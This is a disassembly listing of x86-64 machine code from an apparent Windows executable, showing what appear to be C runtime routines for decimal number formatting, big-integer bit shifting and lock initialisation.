   140007e03:	48 89 c1             	mov    %rax,%rcx
   140007e06:	e8 0e 0a 00 00       	call   0x140008819
   140007e0b:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140007e0f:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140007e13:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007e17:	48 89 c1             	mov    %rax,%rcx
   140007e1a:	e8 af ea ff ff       	call   0x1400068ce
   140007e1f:	83 c0 30             	add    $0x30,%eax
   140007e22:	89 45 74             	mov    %eax,0x74(%rbp)
   140007e25:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140007e29:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140007e2d:	48 89 c1             	mov    %rax,%rcx
   140007e30:	e8 c8 10 00 00       	call   0x140008efd
   140007e35:	85 c0                	test   %eax,%eax
   140007e37:	0f 8f 71 ff ff ff    	jg     0x140007dae
   140007e3d:	8b 45 74             	mov    0x74(%rbp),%eax
   140007e40:	8d 50 01             	lea    0x1(%rax),%edx
   140007e43:	89 55 74             	mov    %edx,0x74(%rbp)
   140007e46:	83 f8 39             	cmp    $0x39,%eax
   140007e49:	0f 84 b0 00 00 00    	je     0x140007eff
   140007e4f:	c7 45 64 20 00 00 00 	movl   $0x20,0x64(%rbp)
   140007e56:	eb 7a                	jmp    0x140007ed2
   140007e58:	83 7d 5c 00          	cmpl   $0x0,0x5c(%rbp)
   140007e5c:	7e 53                	jle    0x140007eb1
   140007e5e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007e62:	ba 01 00 00 00       	mov    $0x1,%edx
   140007e67:	48 89 c1             	mov    %rax,%rcx
   140007e6a:	e8 01 0f 00 00       	call   0x140008d70
   140007e6f:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140007e73:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140007e77:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007e7b:	48 89 c1             	mov    %rax,%rcx
   140007e7e:	e8 7a 10 00 00       	call   0x140008efd
   140007e83:	89 45 5c             	mov    %eax,0x5c(%rbp)
   140007e86:	83 7d 5c 00          	cmpl   $0x0,0x5c(%rbp)
   140007e8a:	7f 10                	jg     0x140007e9c
   140007e8c:	83 7d 5c 00          	cmpl   $0x0,0x5c(%rbp)
   140007e90:	75 18                	jne    0x140007eaa
   140007e92:	8b 45 74             	mov    0x74(%rbp),%eax
   140007e95:	83 e0 01             	and    $0x1,%eax
   140007e98:	85 c0                	test   %eax,%eax
   140007e9a:	74 0e                	je     0x140007eaa
   140007e9c:	8b 45 74             	mov    0x74(%rbp),%eax
   140007e9f:	8d 50 01             	lea    0x1(%rax),%edx
   140007ea2:	89 55 74             	mov    %edx,0x74(%rbp)
   140007ea5:	83 f8 39             	cmp    $0x39,%eax
   140007ea8:	74 58                	je     0x140007f02
   140007eaa:	c7 45 64 20 00 00 00 	movl   $0x20,0x64(%rbp)
   140007eb1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007eb5:	8b 40 14             	mov    0x14(%rax),%eax
   140007eb8:	83 f8 01             	cmp    $0x1,%eax
   140007ebb:	7f 0b                	jg     0x140007ec8
   140007ebd:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007ec1:	8b 40 18             	mov    0x18(%rax),%eax
   140007ec4:	85 c0                	test   %eax,%eax
   140007ec6:	74 09                	je     0x140007ed1
   140007ec8:	c7 45 64 10 00 00 00 	movl   $0x10,0x64(%rbp)
   140007ecf:	eb 01                	jmp    0x140007ed2
   140007ed1:	90                   	nop
   140007ed2:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140007ed6:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140007eda:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140007ede:	8b 55 74             	mov    0x74(%rbp),%edx
   140007ee1:	88 10                	mov    %dl,(%rax)
   140007ee3:	e9 46 02 00 00       	jmp    0x14000812e
   140007ee8:	83 7d 5c 00          	cmpl   $0x0,0x5c(%rbp)
   140007eec:	7e 52                	jle    0x140007f40
   140007eee:	83 7d 44 02          	cmpl   $0x2,0x44(%rbp)
   140007ef2:	74 4c                	je     0x140007f40
   140007ef4:	83 7d 74 39          	cmpl   $0x39,0x74(%rbp)
   140007ef8:	75 24                	jne    0x140007f1e
   140007efa:	eb 07                	jmp    0x140007f03
   140007efc:	90                   	nop
   140007efd:	eb 04                	jmp    0x140007f03
   140007eff:	90                   	nop
   140007f00:	eb 01                	jmp    0x140007f03
   140007f02:	90                   	nop
   140007f03:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140007f07:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140007f0b:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140007f0f:	c6 00 39             	movb   $0x39,(%rax)
   140007f12:	c7 45 64 20 00 00 00 	movl   $0x20,0x64(%rbp)
   140007f19:	e9 9d 01 00 00       	jmp    0x1400080bb
   140007f1e:	c7 45 64 20 00 00 00 	movl   $0x20,0x64(%rbp)
   140007f25:	8b 45 74             	mov    0x74(%rbp),%eax
   140007f28:	8d 48 01             	lea    0x1(%rax),%ecx
   140007f2b:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140007f2f:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140007f33:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140007f37:	89 ca                	mov    %ecx,%edx
   140007f39:	88 10                	mov    %dl,(%rax)
   140007f3b:	e9 ee 01 00 00       	jmp    0x14000812e
   140007f40:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140007f44:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140007f48:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140007f4c:	8b 55 74             	mov    0x74(%rbp),%edx
   140007f4f:	88 10                	mov    %dl,(%rax)
   140007f51:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007f54:	39 45 6c             	cmp    %eax,0x6c(%rbp)
   140007f57:	0f 84 ea 00 00 00    	je     0x140008047
   140007f5d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007f61:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007f67:	ba 0a 00 00 00       	mov    $0xa,%edx
   140007f6c:	48 89 c1             	mov    %rax,%rcx
   140007f6f:	e8 a5 08 00 00       	call   0x140008819
   140007f74:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140007f78:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140007f7c:	48 3b 45 18          	cmp    0x18(%rbp),%rax
   140007f80:	75 25                	jne    0x140007fa7
   140007f82:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007f86:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007f8c:	ba 0a 00 00 00       	mov    $0xa,%edx
   140007f91:	48 89 c1             	mov    %rax,%rcx
   140007f94:	e8 80 08 00 00       	call   0x140008819
   140007f99:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140007f9d:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007fa1:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140007fa5:	eb 36                	jmp    0x140007fdd
   140007fa7:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140007fab:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007fb1:	ba 0a 00 00 00       	mov    $0xa,%edx
   140007fb6:	48 89 c1             	mov    %rax,%rcx
   140007fb9:	e8 5b 08 00 00       	call   0x140008819
   140007fbe:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140007fc2:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007fc6:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140007fcc:	ba 0a 00 00 00       	mov    $0xa,%edx
   140007fd1:	48 89 c1             	mov    %rax,%rcx
   140007fd4:	e8 40 08 00 00       	call   0x140008819
   140007fd9:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140007fdd:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140007fe0:	83 c0 01             	add    $0x1,%eax
   140007fe3:	89 45 b0             	mov    %eax,-0x50(%rbp)
   140007fe6:	e9 71 fc ff ff       	jmp    0x140007c5c
   140007feb:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%rbp)
   140007ff2:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140007ff6:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007ffa:	48 89 c1             	mov    %rax,%rcx
   140007ffd:	e8 cc e8 ff ff       	call   0x1400068ce
   140008002:	83 c0 30             	add    $0x30,%eax
   140008005:	89 45 74             	mov    %eax,0x74(%rbp)
   140008008:	48 8b 45 00          	mov    0x0(%rbp),%rax
   14000800c:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140008010:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140008014:	8b 55 74             	mov    0x74(%rbp),%edx
   140008017:	88 10                	mov    %dl,(%rax)
   140008019:	8b 45 b0             	mov    -0x50(%rbp),%eax
   14000801c:	39 45 6c             	cmp    %eax,0x6c(%rbp)
   14000801f:	7e 29                	jle    0x14000804a
   140008021:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140008025:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   14000802b:	ba 0a 00 00 00       	mov    $0xa,%edx
   140008030:	48 89 c1             	mov    %rax,%rcx
   140008033:	e8 e1 07 00 00       	call   0x140008819
   140008038:	48 89 45 28          	mov    %rax,0x28(%rbp)
   14000803c:	8b 45 b0             	mov    -0x50(%rbp),%eax
   14000803f:	83 c0 01             	add    $0x1,%eax
   140008042:	89 45 b0             	mov    %eax,-0x50(%rbp)
   140008045:	eb ab                	jmp    0x140007ff2
   140008047:	90                   	nop
   140008048:	eb 01                	jmp    0x14000804b
   14000804a:	90                   	nop
   14000804b:	83 7d 44 00          	cmpl   $0x0,0x44(%rbp)
   14000804f:	74 26                	je     0x140008077
   140008051:	83 7d 44 02          	cmpl   $0x2,0x44(%rbp)
   140008055:	0f 84 ae 00 00 00    	je     0x140008109
   14000805b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000805f:	8b 40 14             	mov    0x14(%rax),%eax
   140008062:	83 f8 01             	cmp    $0x1,%eax
   140008065:	7f 50                	jg     0x1400080b7
   140008067:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000806b:	8b 40 18             	mov    0x18(%rax),%eax
   14000806e:	85 c0                	test   %eax,%eax
   140008070:	75 45                	jne    0x1400080b7
   140008072:	e9 92 00 00 00       	jmp    0x140008109
   140008077:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000807b:	ba 01 00 00 00       	mov    $0x1,%edx
   140008080:	48 89 c1             	mov    %rax,%rcx
   140008083:	e8 e8 0c 00 00       	call   0x140008d70
   140008088:	48 89 45 28          	mov    %rax,0x28(%rbp)
   14000808c:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140008090:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140008094:	48 89 c1             	mov    %rax,%rcx
   140008097:	e8 61 0e 00 00       	call   0x140008efd
   14000809c:	89 45 60             	mov    %eax,0x60(%rbp)
   14000809f:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   1400080a3:	7f 15                	jg     0x1400080ba
   1400080a5:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   1400080a9:	75 61                	jne    0x14000810c
   1400080ab:	8b 45 74             	mov    0x74(%rbp),%eax
   1400080ae:	83 e0 01             	and    $0x1,%eax
   1400080b1:	85 c0                	test   %eax,%eax
   1400080b3:	74 57                	je     0x14000810c
   1400080b5:	eb 03                	jmp    0x1400080ba
   1400080b7:	90                   	nop
   1400080b8:	eb 01                	jmp    0x1400080bb
   1400080ba:	90                   	nop
   1400080bb:	c7 45 64 20 00 00 00 	movl   $0x20,0x64(%rbp)
   1400080c2:	eb 1f                	jmp    0x1400080e3
   1400080c4:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400080c8:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
   1400080cc:	75 15                	jne    0x1400080e3
   1400080ce:	83 45 58 01          	addl   $0x1,0x58(%rbp)
   1400080d2:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400080d6:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400080da:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   1400080de:	c6 00 31             	movb   $0x31,(%rax)
   1400080e1:	eb 4b                	jmp    0x14000812e
   1400080e3:	48 83 6d 00 01       	subq   $0x1,0x0(%rbp)
   1400080e8:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400080ec:	0f b6 00             	movzbl (%rax),%eax
   1400080ef:	3c 39                	cmp    $0x39,%al
   1400080f1:	74 d1                	je     0x1400080c4
   1400080f3:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400080f7:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400080fb:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   1400080ff:	0f b6 10             	movzbl (%rax),%edx
   140008102:	83 c2 01             	add    $0x1,%edx
   140008105:	88 10                	mov    %dl,(%rax)
   140008107:	eb 25                	jmp    0x14000812e
   140008109:	90                   	nop
   14000810a:	eb 01                	jmp    0x14000810d
   14000810c:	90                   	nop
   14000810d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140008111:	8b 40 14             	mov    0x14(%rax),%eax
   140008114:	83 f8 01             	cmp    $0x1,%eax
   140008117:	7f 0b                	jg     0x140008124
   140008119:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000811d:	8b 40 18             	mov    0x18(%rax),%eax
   140008120:	85 c0                	test   %eax,%eax
   140008122:	74 09                	je     0x14000812d
   140008124:	c7 45 64 10 00 00 00 	movl   $0x10,0x64(%rbp)
   14000812b:	eb 01                	jmp    0x14000812e
   14000812d:	90                   	nop
   14000812e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008132:	48 89 c1             	mov    %rax,%rcx
   140008135:	e8 54 06 00 00       	call   0x14000878e
   14000813a:	48 83 7d 18 00       	cmpq   $0x0,0x18(%rbp)
   14000813f:	74 31                	je     0x140008172
   140008141:	48 83 7d 20 00       	cmpq   $0x0,0x20(%rbp)
   140008146:	74 16                	je     0x14000815e
   140008148:	48 8b 45 20          	mov    0x20(%rbp),%rax
   14000814c:	48 3b 45 18          	cmp    0x18(%rbp),%rax
   140008150:	74 0c                	je     0x14000815e
   140008152:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140008156:	48 89 c1             	mov    %rax,%rcx
   140008159:	e8 30 06 00 00       	call   0x14000878e
   14000815e:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140008162:	48 89 c1             	mov    %rax,%rcx
   140008165:	e8 24 06 00 00       	call   0x14000878e
   14000816a:	eb 0e                	jmp    0x14000817a
   14000816c:	90                   	nop
   14000816d:	eb 0b                	jmp    0x14000817a
   14000816f:	90                   	nop
   140008170:	eb 08                	jmp    0x14000817a
   140008172:	90                   	nop
   140008173:	eb 05                	jmp    0x14000817a
   140008175:	48 83 6d 00 01       	subq   $0x1,0x0(%rbp)
   14000817a:	48 8b 45 00          	mov    0x0(%rbp),%rax
   14000817e:	48 39 45 e8          	cmp    %rax,-0x18(%rbp)
   140008182:	73 0f                	jae    0x140008193
   140008184:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140008188:	48 83 e8 01          	sub    $0x1,%rax
   14000818c:	0f b6 00             	movzbl (%rax),%eax
   14000818f:	3c 30                	cmp    $0x30,%al
   140008191:	74 e2                	je     0x140008175
   140008193:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140008197:	48 89 c1             	mov    %rax,%rcx
   14000819a:	e8 ef 05 00 00       	call   0x14000878e
   14000819f:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400081a3:	c6 00 00             	movb   $0x0,(%rax)
   1400081a6:	8b 45 58             	mov    0x58(%rbp),%eax
   1400081a9:	8d 50 01             	lea    0x1(%rax),%edx
   1400081ac:	48 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%rax
   1400081b3:	89 10                	mov    %edx,(%rax)
   1400081b5:	48 83 bd c8 00 00 00 	cmpq   $0x0,0xc8(%rbp)
   1400081bc:	00 
   1400081bd:	74 0e                	je     0x1400081cd
   1400081bf:	48 8b 85 c8 00 00 00 	mov    0xc8(%rbp),%rax
   1400081c6:	48 8b 55 00          	mov    0x0(%rbp),%rdx
   1400081ca:	48 89 10             	mov    %rdx,(%rax)
   1400081cd:	48 8b 85 a8 00 00 00 	mov    0xa8(%rbp),%rax
   1400081d4:	8b 00                	mov    (%rax),%eax
   1400081d6:	0b 45 64             	or     0x64(%rbp),%eax
   1400081d9:	89 c2                	mov    %eax,%edx
   1400081db:	48 8b 85 a8 00 00 00 	mov    0xa8(%rbp),%rax
   1400081e2:	89 10                	mov    %edx,(%rax)
   1400081e4:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400081e8:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   1400081ef:	5d                   	pop    %rbp
   1400081f0:	c3                   	ret
   1400081f1:	90                   	nop
   1400081f2:	90                   	nop
   1400081f3:	90                   	nop
   1400081f4:	90                   	nop
   1400081f5:	90                   	nop
   1400081f6:	90                   	nop
   1400081f7:	90                   	nop
   1400081f8:	90                   	nop
   1400081f9:	90                   	nop
   1400081fa:	90                   	nop
   1400081fb:	90                   	nop
   1400081fc:	90                   	nop
   1400081fd:	90                   	nop
   1400081fe:	90                   	nop
   1400081ff:	90                   	nop
   140008200:	55                   	push   %rbp
   140008201:	48 89 e5             	mov    %rsp,%rbp
   140008204:	48 83 ec 10          	sub    $0x10,%rsp
   140008208:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000820c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008210:	8b 00                	mov    (%rax),%eax
   140008212:	f3 0f bc c0          	tzcnt  %eax,%eax
   140008216:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140008219:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000821d:	8b 10                	mov    (%rax),%edx
   14000821f:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140008222:	89 c1                	mov    %eax,%ecx
   140008224:	d3 ea                	shr    %cl,%edx
   140008226:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000822a:	89 10                	mov    %edx,(%rax)
   14000822c:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000822f:	48 83 c4 10          	add    $0x10,%rsp
   140008233:	5d                   	pop    %rbp
   140008234:	c3                   	ret
   140008235:	55                   	push   %rbp
   140008236:	48 89 e5             	mov    %rsp,%rbp
   140008239:	48 83 ec 20          	sub    $0x20,%rsp
   14000823d:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140008241:	89 55 18             	mov    %edx,0x18(%rbp)
   140008244:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008248:	48 83 c0 18          	add    $0x18,%rax
   14000824c:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008250:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008254:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008258:	8b 45 18             	mov    0x18(%rbp),%eax
   14000825b:	c1 f8 05             	sar    $0x5,%eax
   14000825e:	89 45 e8             	mov    %eax,-0x18(%rbp)
   140008261:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008265:	8b 40 14             	mov    0x14(%rax),%eax
   140008268:	39 45 e8             	cmp    %eax,-0x18(%rbp)
   14000826b:	0f 8d e4 00 00 00    	jge    0x140008355
   140008271:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008275:	8b 40 14             	mov    0x14(%rax),%eax
   140008278:	48 98                	cltq
   14000827a:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008281:	00 
   140008282:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008286:	48 01 d0             	add    %rdx,%rax
   140008289:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000828d:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140008290:	48 98                	cltq
   140008292:	48 c1 e0 02          	shl    $0x2,%rax
   140008296:	48 01 45 f8          	add    %rax,-0x8(%rbp)
   14000829a:	83 65 18 1f          	andl   $0x1f,0x18(%rbp)
   14000829e:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   1400082a2:	0f 84 a3 00 00 00    	je     0x14000834b
   1400082a8:	b8 20 00 00 00       	mov    $0x20,%eax
   1400082ad:	2b 45 18             	sub    0x18(%rbp),%eax
   1400082b0:	89 45 e8             	mov    %eax,-0x18(%rbp)
   1400082b3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400082b7:	48 8d 50 04          	lea    0x4(%rax),%rdx
   1400082bb:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   1400082bf:	8b 10                	mov    (%rax),%edx
   1400082c1:	8b 45 18             	mov    0x18(%rbp),%eax
   1400082c4:	89 c1                	mov    %eax,%ecx
   1400082c6:	d3 ea                	shr    %cl,%edx
   1400082c8:	89 d0                	mov    %edx,%eax
   1400082ca:	89 45 ec             	mov    %eax,-0x14(%rbp)
   1400082cd:	eb 3c                	jmp    0x14000830b
   1400082cf:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400082d3:	8b 10                	mov    (%rax),%edx
   1400082d5:	8b 45 e8             	mov    -0x18(%rbp),%eax
   1400082d8:	89 c1                	mov    %eax,%ecx
   1400082da:	d3 e2                	shl    %cl,%edx
   1400082dc:	89 d1                	mov    %edx,%ecx
   1400082de:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400082e2:	48 8d 50 04          	lea    0x4(%rax),%rdx
   1400082e6:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   1400082ea:	0b 4d ec             	or     -0x14(%rbp),%ecx
   1400082ed:	89 ca                	mov    %ecx,%edx
   1400082ef:	89 10                	mov    %edx,(%rax)
   1400082f1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400082f5:	48 8d 50 04          	lea    0x4(%rax),%rdx
   1400082f9:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   1400082fd:	8b 10                	mov    (%rax),%edx
   1400082ff:	8b 45 18             	mov    0x18(%rbp),%eax
   140008302:	89 c1                	mov    %eax,%ecx
   140008304:	d3 ea                	shr    %cl,%edx
   140008306:	89 d0                	mov    %edx,%eax
   140008308:	89 45 ec             	mov    %eax,-0x14(%rbp)
   14000830b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000830f:	48 3b 45 e0          	cmp    -0x20(%rbp),%rax
   140008313:	72 ba                	jb     0x1400082cf
   140008315:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008319:	8b 55 ec             	mov    -0x14(%rbp),%edx
   14000831c:	89 10                	mov    %edx,(%rax)
   14000831e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008322:	8b 00                	mov    (%rax),%eax
   140008324:	85 c0                	test   %eax,%eax
   140008326:	74 2d                	je     0x140008355
   140008328:	48 83 45 f0 04       	addq   $0x4,-0x10(%rbp)
   14000832d:	eb 26                	jmp    0x140008355
   14000832f:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140008333:	48 8d 42 04          	lea    0x4(%rdx),%rax
   140008337:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000833b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000833f:	48 8d 48 04          	lea    0x4(%rax),%rcx
   140008343:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
   140008347:	8b 12                	mov    (%rdx),%edx
   140008349:	89 10                	mov    %edx,(%rax)
   14000834b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000834f:	48 3b 45 e0          	cmp    -0x20(%rbp),%rax
   140008353:	72 da                	jb     0x14000832f
   140008355:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008359:	48 83 c0 18          	add    $0x18,%rax
   14000835d:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140008361:	48 29 c2             	sub    %rax,%rdx
   140008364:	48 89 d0             	mov    %rdx,%rax
   140008367:	48 c1 f8 02          	sar    $0x2,%rax
   14000836b:	89 c2                	mov    %eax,%edx
   14000836d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008371:	89 50 14             	mov    %edx,0x14(%rax)
   140008374:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008378:	8b 40 14             	mov    0x14(%rax),%eax
   14000837b:	85 c0                	test   %eax,%eax
   14000837d:	75 0b                	jne    0x14000838a
   14000837f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008383:	c7 40 18 00 00 00 00 	movl   $0x0,0x18(%rax)
   14000838a:	90                   	nop
   14000838b:	48 83 c4 20          	add    $0x20,%rsp
   14000838f:	5d                   	pop    %rbp
   140008390:	c3                   	ret
   140008391:	55                   	push   %rbp
   140008392:	48 89 e5             	mov    %rsp,%rbp
   140008395:	48 83 ec 40          	sub    $0x40,%rsp
   140008399:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000839d:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
   1400083a4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400083a8:	48 83 c0 18          	add    $0x18,%rax
   1400083ac:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400083b0:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400083b4:	8b 40 14             	mov    0x14(%rax),%eax
   1400083b7:	48 98                	cltq
   1400083b9:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   1400083c0:	00 
   1400083c1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400083c5:	48 01 d0             	add    %rdx,%rax
   1400083c8:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400083cc:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
   1400083d3:	eb 09                	jmp    0x1400083de
   1400083d5:	83 45 f4 20          	addl   $0x20,-0xc(%rbp)
   1400083d9:	48 83 45 f8 04       	addq   $0x4,-0x8(%rbp)
   1400083de:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400083e2:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
   1400083e6:	73 0a                	jae    0x1400083f2
   1400083e8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400083ec:	8b 00                	mov    (%rax),%eax
   1400083ee:	85 c0                	test   %eax,%eax
   1400083f0:	74 e3                	je     0x1400083d5
   1400083f2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400083f6:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
   1400083fa:	73 18                	jae    0x140008414
   1400083fc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008400:	8b 00                	mov    (%rax),%eax
   140008402:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140008405:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
   140008409:	48 89 c1             	mov    %rax,%rcx
   14000840c:	e8 ef fd ff ff       	call   0x140008200
   140008411:	01 45 f4             	add    %eax,-0xc(%rbp)
   140008414:	8b 45 f4             	mov    -0xc(%rbp),%eax
   140008417:	48 83 c4 40          	add    $0x40,%rsp
   14000841b:	5d                   	pop    %rbp
   14000841c:	c3                   	ret
   14000841d:	90                   	nop
   14000841e:	90                   	nop
   14000841f:	90                   	nop
   140008420:	55                   	push   %rbp
   140008421:	48 89 e5             	mov    %rsp,%rbp
   140008424:	48 83 ec 40          	sub    $0x40,%rsp
   140008428:	48 8d 05 e1 8d 00 00 	lea    0x8de1(%rip),%rax        # 0x140011210
   14000842f:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008433:	c7 45 ec 03 00 00 00 	movl   $0x3,-0x14(%rbp)
   14000843a:	8b 55 ec             	mov    -0x14(%rbp),%edx
   14000843d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008441:	87 10                	xchg   %edx,(%rax)
   140008443:	89 d0                	mov    %edx,%eax
   140008445:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140008448:	83 7d f8 02          	cmpl   $0x2,-0x8(%rbp)
   14000844c:	75 3d                	jne    0x14000848b
   14000844e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140008455:	eb 2e                	jmp    0x140008485
   140008457:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000845a:	48 63 d0             	movslq %eax,%rdx
   14000845d:	48 89 d0             	mov    %rdx,%rax
   140008460:	48 c1 e0 02          	shl    $0x2,%rax
   140008464:	48 01 d0             	add    %rdx,%rax
   140008467:	48 c1 e0 03          	shl    $0x3,%rax
   14000846b:	48 8d 15 4e 8d 00 00 	lea    0x8d4e(%rip),%rdx        # 0x1400111c0
   140008472:	48 01 d0             	add    %rdx,%rax
   140008475:	48 89 c1             	mov    %rax,%rcx
   140008478:	48 8b 05 d9 9d 00 00 	mov    0x9dd9(%rip),%rax        # 0x140012258
   14000847f:	ff d0                	call   *%rax
   140008481:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140008485:	83 7d fc 01          	cmpl   $0x1,-0x4(%rbp)
   140008489:	7e cc                	jle    0x140008457
   14000848b:	90                   	nop
   14000848c:	48 83 c4 40          	add    $0x40,%rsp
   140008490:	5d                   	pop    %rbp
   140008491:	c3                   	ret
   140008492:	55                   	push   %rbp
   140008493:	48 89 e5             	mov    %rsp,%rbp
   140008496:	48 83 ec 40          	sub    $0x40,%rsp
   14000849a:	89 4d 10             	mov    %ecx,0x10(%rbp)
   14000849d:	8b 05 6d 8d 00 00    	mov    0x8d6d(%rip),%eax        # 0x140011210
   1400084a3:	83 f8 02             	cmp    $0x2,%eax
   1400084a6:	75 2c                	jne    0x1400084d4
